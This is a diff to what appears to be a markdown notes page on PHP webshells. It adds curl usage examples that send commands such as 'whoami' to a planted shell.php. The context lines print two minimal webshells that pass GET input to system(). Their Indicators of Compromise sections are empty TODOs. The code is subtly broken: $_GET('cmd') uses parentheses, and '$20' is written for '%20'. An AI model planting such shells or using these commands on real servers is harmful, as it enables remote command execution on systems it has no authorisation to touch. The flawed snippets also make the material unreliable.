@@ -21,6 +21,13 @@ This is the shortest possible PHP webshell, the output from commands ran are not
 <?php system($_GET('cmd')); ?>
 ```
 
+To use this webshell, the command must be url encoded and must be formatted like so:
+
+```bash
+curl http://ip/shell.php?cmd=whoami
+curl http://ip/shell.php?cmd=ip$20a
+```
+
 #### Indicators of Compromise
 
 TODO
@@ -31,6 +38,13 @@ This basic webshell wraps the output of the command into HTML pre tags, this wil
 
 ```php
 <?php echo "<pre>"; system($_GET('cmd')); echo "</pre>"; ?>
+```
+
+To use this webshell, the command must be url encoded and must be formatted like so:
+
+```bash
+curl http://ip/shell.php?cmd=whoami
+curl http://ip/shell.php?cmd=ip$20a
 ```
 
 #### Indicators of Compromise
